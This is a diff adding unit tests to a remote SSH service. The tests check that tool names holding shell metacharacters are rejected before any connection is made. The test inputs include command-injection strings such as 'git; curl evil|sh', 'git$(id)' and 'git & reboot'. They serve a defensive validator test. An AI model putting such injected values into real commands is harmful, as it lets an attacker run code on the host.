@@ -137,3 +137,19 @@ apk
 		}
 	});
 });
+
+describe("installTools 工具名注入防护（0.103 审计）", () => {
+	it("shell 元字符直接拒绝，不触达连接与远端 shell", async () => {
+		const svc = new RemoteSshService(os.tmpdir());
+		for (const bad of ["git; curl evil|sh", "git$(id)", "git`id`", "git & reboot", "../../etc", "git\ncurl"]) {
+			const r = await svc.installTools("no-such-connection", [bad]);
+			expect(r.ok).toBe(false);
+			expect(r.error).toContain("非法的工具名");
+		}
+	});
+
+	it("合法工具名放行到连接层（未知连接按原样抛连接错误）", async () => {
+		const svc = new RemoteSshService(os.tmpdir());
+		await expect(svc.installTools("no-such-connection", ["git"])).rejects.toThrowError("连接已断开或不存在");
+	});
+});
